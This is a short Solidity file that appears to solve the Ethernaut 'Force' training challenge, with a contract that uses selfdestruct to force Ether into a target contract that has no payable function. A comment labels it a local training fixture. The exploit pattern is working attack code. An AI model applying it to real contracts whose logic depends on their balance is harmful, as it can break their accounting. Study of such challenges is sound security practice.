// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautForce {
    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ForceBomb {
    constructor() payable {}

    function detonate(address payable target) external {
        selfdestruct(target);
    }
}

contract ForceAttack {
    function attack(EthernautForce target) external payable {
        ForceBomb bomb = new ForceBomb{value: msg.value}();
        bomb.detonate(payable(address(target)));
    }
}

// Force is intentionally a local training fixture. Solidity 0.8.25 deprecates
// selfdestruct semantics in future forks, but the current local EVM models it.

